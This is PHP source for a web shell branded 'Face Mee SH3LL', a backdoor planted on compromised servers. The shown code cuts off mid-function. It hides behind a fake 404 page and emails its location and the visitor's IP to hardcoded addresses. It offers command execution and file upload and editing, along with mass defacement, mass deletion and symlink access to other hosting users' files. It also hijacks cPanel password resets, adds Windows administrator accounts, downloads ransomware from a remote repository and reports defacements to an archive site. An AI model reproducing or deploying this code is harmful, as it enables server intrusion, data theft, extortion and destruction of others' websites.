<?php
@session_start();
@set_time_limit(0);

$site = $_SERVER['HTTP_HOST']; 

$chk_login = true;
$arif = "shell";


if(isset($_GET['login']) && ($_GET['login']) == $arif)
{
 $_SESSION['login'] = $arif;
}

if($chk_login == true)
{
 if(!isset($_SESSION['login']) or $_SESSION['login'] != $arif)
 {
 die("
 <<!DOCTYPE html>
<html>
<head>
<meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no' >
<title> 404 Not Found - ".$site."
</title></head>
<body style='color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;'>
<div style='height:auto; min-height:100%; '>     <div style='text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;'>
        <h1 style='margin:0; font-size:150px; line-height:150px; font-weight:bold;'>404</h1>
<h2 style='margin-top:20px;font-size: 30px;'>Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
</div></div><div style='color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;'>
<br>Proudly powered by  <a style='color:#fff;' href='http://www.litespeedtech.com/error-page'>LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>");
 }
}


set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_GET as $key=>$value){
$_GET[$key] = stripslashes($value);
}
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font size=2 >ON</font>' : '<font size=2 >OFF</font>';
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
    <link href="https://fonts.googleapis.com/css?family=Audiowide|Space+Mono" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<title>Face Mee  SH3LL - '.$site.'</title>
<style>
body{
font-family: Kelly Slab;
background-color: black;
color:white;
}
#content tr:hover{
background-color: cyan;
text-shadow:0px 0px 10px white;
}
#content .first{
background-color: lime;
}
#content .first:hover{
background-color: red;
text-shadow:0px 0px 1px #FF4C00;
}
table{
background:transparent;
  border:1px solid blue;
  font-family:Kelly Slab;
  cursor:pointer;
  color:#15CFF4;
  font-size:10x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:none;
}
H1{
font-family: "Rancho", jolly lodger;
}
a{
color: #ffffff;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #FCFF00 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center><br><font size=20><font color=red><center>-=[<font color=cyan>Face </font><font color=lime>mee</font><font color=yellow> 5H311</font><font color=red>]=-</font></center></H1></font></font><br>
<body class="  pace-done" bgcolor="black"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="width: 100%;">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color=lime><i>
Current Path : ';
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'arifhada123@gmail.com';
$tujuanmail2 = 'bulelileli090@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
mail($tujuanmail2, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';

           
if (isset($_GET['Jumping'])) {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$url_user'><font color=#18BC9C>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$url_user'><font color=#18BC9C>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" class="btn btn-success btn-sm" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");    
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
}if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">SUCCESS</font><br />';
}else{
echo '<font color="red">ERROR</font><br />';
}

}
echo '<i><font color=lime>'.php_uname().'<br>  <b><font color=aqua>YOUR IP:</font><font color=lime> '.$_SERVER['REMOTE_ADDR'].'</b><br>';
echo '<i><font color=aqua>Server ip:</font><font color=lime> '.gethostbyname($_SERVER['HTTP_HOST']).'</font><br>';
echo '<i><font color=aqua>Home Root :</font><font color=lime> '.$_SERVER['DOCUMENT_ROOT'].'</font><br>';
echo '<i><font color=aqua>Safe mode :</font><font color=lime> '.$sm.'</font><center>';
echo '<center><form enctype="multipart/form-data" method="POST"><hr>
<br><input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form><hr><ul><center><br>
<a href=?login='.$arif.'><input type="submit" value="HOME+perbarui sesi" /></a> 
<a href=?Mass><input type="submit" value="MASS DEFACE" /></a>
<a href=?dir='.$path.'&riset=cp><input type="submit" value="Riset Cpanel" /></a>
<a href=?dir='.$path.'&mas=del><input type="submit" value="MASS DELETE" /></a><br><br>
<a href=?cegns><input type="submit" value="COMMAND" /></a>
<a href=?Jumping><input type="submit" value="JUMPING" /></a>
<a  href=?create=rdp> <input type="submit" value="Create Rdp" /></a>
<a href=?dir='.$path.'&do=fjr19gns><input type="submit" value="DEFACER.ID" /></a><br><br>
<a href=?adm=ner><input type="submit" value="adminer" /></a>
<a href=?stuck=sym><input type="submit" value="Symlink" /></a>
<a href=?rans=ware><input type="submit" value="ransomware" /></a>
<a href=?bunuh><input type="submit" value="KILL" /></a></center><hr>';

if(isset($_GET['cegns'])) {
    echo "<i><form method='post'>
    <font color=aqua style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
    <input type='text' size='20' height='10' name='arifc'><input type='submit' name='e_arif' value='>>'>
    </form>";
    if($_POST['e_arif']) {
        echo "<pre>".exe($_POST['arifc'])."</pre>";
        }
    }elseif($_GET['adm'] == 'ner') {
  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
  function adminer($url, $isi) {
    $fp = fopen($isi, "w");
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
          curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }
  if(file_exists('adminer.php')) {
    echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
  } else {
    if(adminer("https://raw.githubusercontent.com/eviltwin-dev/adm/master/adminer.php","adminer.php")) {
      echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
    } else {
      echo "<center><font>Failed to create file adminer.</font></center>";
    }
  }
} elseif($_GET['stuck'] == 'sym') {
  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
if($d0mains){
@mkdir("sx_sym",0777);
@chdir("sx_sym");
@exe("ln -s / sxc");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='sx_sym/sxc/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("sx_sym",0777);
@chdir("sx_sym");
exe("ln -s / sxc");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=sx_sym/sxc/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("sx_sym",0777);@chdir("sx_sym");@exe("ln -s / sxc");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <h2>Server Symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=sx_sym/sxc/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center><br>";
 }
 }    
}elseif($_GET['rans'] == 'ware') {
  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
  function ransom($url, $isi) {
    $fp = fopen($isi, "w");
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
          curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }
  if(file_exists('ransom.php')) {
    echo "<center><font><a href='$full/ransom.php' target='_blank'>> Go To pak boy ransomware <</a></font></center>";
  } else {
    if(ransom("https://raw.githubusercontent.com/facemeee/shell/main/ransom.php","ransom.php")) {
      echo "<center><font><a href='$full/ransom.php' target='_blank'>> Go To pak boy ransomware<</a></font></center>";
    } else {
      echo "<center><font>Failed to create file ransomware.</font></center>";
    }
  }
}elseif($_GET['create'] == 'rdp'){
  if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { ?><center><br/><br/>
            <div id="content-left">
                <form class="arif_table" action="" method="post">
                <table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
                  <tr>
                    <td colspan="3" align="center" bgcolor="#2d2b2b" ><font colspan="3" align="center" bgcolor="#2d2b2b"><font size="2px" color="white">CREATE RDP</font></td>
                  </tr>
                  <tr>
                    <td><font>Username</font></td>
                    <td><font> : </font></td>
                    <td><input type="text"  name="username" required></td>
                  </tr>
                  <tr>
                    <td><font>Password</font></td>
                    <td><font> : </font></td>
                    <td><input type="text"  name="password" required></td>
                  </tr>
                  <tr>
                    <td colspan="3" align="center"><input type="hidden" name="kshell" value="1"><input type="submit" name="submit"  value="Create"></td>
                  </tr>
                </table>
                </form>
                </div>
                <br/>
                <div align="center" id="content-left">
                <form class="arif_table" action="" method="post">
                  <table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
                    <tr>
                      <td colspan="3" align="center" bgcolor="#2d2b2b"><font size="2px" color="white">OPTION</td>
                    </tr>
                    <tr>
                      <td><font>Username</font></td>
                      <td><font> : </font></td>
                      <td><input type="text" name="rusername" placeholder="Username" ></td>
                    </tr>
                    <tr>
                      <td><font>Password</font></td>
                      <td><font> : </font></td>
                      <td><input type="text" name="gantipw" placeholder="Password"></td>
                    </tr>
                    <tr>
                      <td><font>Action</font></td>
                      <td><font> : </font></td>
                      <td>
                        <select name="aksi" >
                            <option value="1">Show Username</option>
                            <option value="2">Delete Username</option>
                            <option value="3">Change Password</option>
                        </select>
                      </td>
                    </tr>
                    <tr>
                        <td colspan="3" align="center"><input type="hidden" name="kshell" value="2"><input type="submit" align="center" name="submit"  value="Execute"></td>
                    </tr>
                  </table>
                </form>
                <br/>
            </div>
            </center></center>
          <?php  if($_POST['submit']) { if($_POST['kshell']=="1") { $r_user = $_POST['username']; $r_pass = $_POST['password']; $cmd_cek_user = shell_exec("net user"); if(preg_match("/$r_user/", $cmd_cek_user)){ echo $gaya_root.$r_user." already available".$o; }else { $cmd_add_user = shell_exec("net user ".$r_user." ".$r_pass." /add"); $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add"); $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add"); $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add"); if($cmd_add_user){ echo $gaya_root."<font size=2>[x] Add User : ".$r_user." Password : ".$r_pass." <font color=#B0B0B0>Success!</font></font><br/><br/>".$o; }else { echo $gaya_root."<font size=2>[x] Add User : ".$r_user." Password : ".$r_pass." <font color=#B0B0B0>Failed!</font><br/><br/>".$o; } echo "<font size=2>[x] Processing Users, Please Wait a minute..<br/>"; if($cmd_add_groups1){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font size=2>Successfully Processed!</font><br/><br/>".$o; }else if($cmd_add_groups2){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font size=2 color=#B0B0B0>Successfully Processed!</font><br/><br/>".$o; }else if($cmd_add_groups3){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font color=#B0B0B0>Successfully Processed!</font><br/><br/>".$o; }else { echo $gaya_root."<font size=2>[x] Sorry User ".$r_user." <font color=#B0B0B0>Failure to Process!</font><br/><br/>".$o; } echo "<font size=2>[x] Server Info : </font><br/>"; echo $gaya_root."<font size=2>[x] ServerIP : ".$_SERVER["HTTP_HOST"]."</font><br/><font size=2>[x] Username  : ".$r_user."</font><br/><font size=2>[x] Password  : </font>".$r_pass.$o."</font><br/><br/>"; echo "<font size=2>[x] Thank for using it [x]</font><br/><br/>"; } } else if($_POST['kshell']=="2") { echo "<style>
                  </style>"; if($_POST['aksi']=="1"){ echo "<pre>".shell_exec("net user"); } else if($_POST['aksi']=="2") { $username = $_POST['rusername']; $cmd_cek_user = shell_exec("net user"); if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username." /DELETE"); if($cmd_add_user){ echo "<font size=2>[x] Processing, Please Wait..</font><br /><br />"; echo $gaya_root."<font size=2>[x] Congratulations! Remove User  </font><font size=2>".$username." </font><font color=#B0B0B0>Success !!</font><br /><br />".$o; }else { echo $gaya_root."<font size=2>[x] Yeah :( Remove User  </font><font size=2>".$username." </font><font color=#B0B0B0>Failed!!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2>Are You Kidding Me?! Username : </font><font size=2>" .$username. " </font><font color=#B0B0B0> It Does Not Exist !! </font><br /><br />".$o; } }else { echo $gaya_root."<font size=2> Please Enter the First Username to delete !! </font><br /><br />".$o; } } else if($_POST['aksi']=="3") { echo "<style> 
                    </style>"; $username = $_POST['rusername']; $password = $_POST['gantipw']; $cmd_cek_user = shell_exec("net user"); if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username.""); if($cmd_add_user){ echo $gaya_root."<font size=2>Change the Username Password : ".$username." and Password : ".$password." <font color=#B0B0B0>Success !!</font><br /><br />".$o; }else { echo $gaya_root."<font size=2>Change Username Password: ".$username." dan Password : ".$password." <font color=#B0B0B0>Failed!!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2>Are You Kidding Me?! Username : </font><font'>" .$username. " </font><font size=2 color=#B0B0B0> It Doesn't Exist !!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2> Please Enter the First Username to delete !! </font><br><br</center>".$o; } } } } } else{ echo "<br><br><center><font color='#B0B0B0'>TOOLS CANNOT BE USED, THE SERVICE IS NOT WINDOWS!</font></center>"; } 
}elseif($_GET['riset'] == 'cp') {
  echo '<center><div style="border-radius: 6px;padding: 4px 2px;width: 24%;line-height: 24px;background: #1E1E1E;color:white;"><br><p>
<form action="#" method="post"><b> Email : </b><input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:#1E1E1E;" /><input type="submit" name="submit" value="Send!" style="style="border-radius: 6px;font: 9px; color:#1E1E1E;"/></form><br></p></div></center>';
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');
if(isset($_POST['submit'])){
$email = $_POST['email'];
$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center><a href="//'.$parm.'">'.$parm.'</a></center>';
echo '<br/><center>user:'.$user.'</center>'; }
 
} elseif($_GET['mas'] == 'del') {function mass_delete($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#434343>OK</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = mass_delete($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
mass_delete($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form class='arif_table' method='post'>
   <font>Folder :</font><br>
   <input class='arif_table' type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input class='arif_table' type='text' name='d_file' placeholder='sx.php' style='width: 450px;' height='10'><br>
   <input class='arif_table' type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form></center><br>";
   }
} 
if (isset($_GET['Mass'])) {
echo "<center><form method='POST'><br>Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>File Name : <input type='text' name='file_name' value='x.php'><br><br><br>Your Script : <br><textarea style='width: 300px; height: 100px;' name='index'>Owned By facemee </textarea><br><input type='submit' value='Submit'></form></center><br><br>";
}
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: lime'>Done</span><br>";
                }
        endforeach;
}if (isset($_GET['bunuh'])) {
    if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
            die('<center><br><center><h2>Shell Telah Dihapus</h2><br>Terimakasih Atas Perjuanganmu Wahai Kawan Ku</center></center>');
        else
            echo '<center>unlink failed!</center>';
            }
            elseif($_GET['do'] == 'face') {
echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='notiper' size='50' value='Mr.p3mu14'><br>
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='StuckXploiter'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
        <input type='submit' name='go' value='Submit' style='width: 450px;'>
        </form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$notiper = $_POST['notiper'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://defacer.id/archive/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$notiper";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

echo '</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">5UCC355</font><br />';
}else{
echo '<font color="red">3RR0R</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">5UCC355</font><br />';
}else{
echo '<font color="red">3RR0R</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">DONE</font><br />';
}else{
echo '<font color="red">GAGAL</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
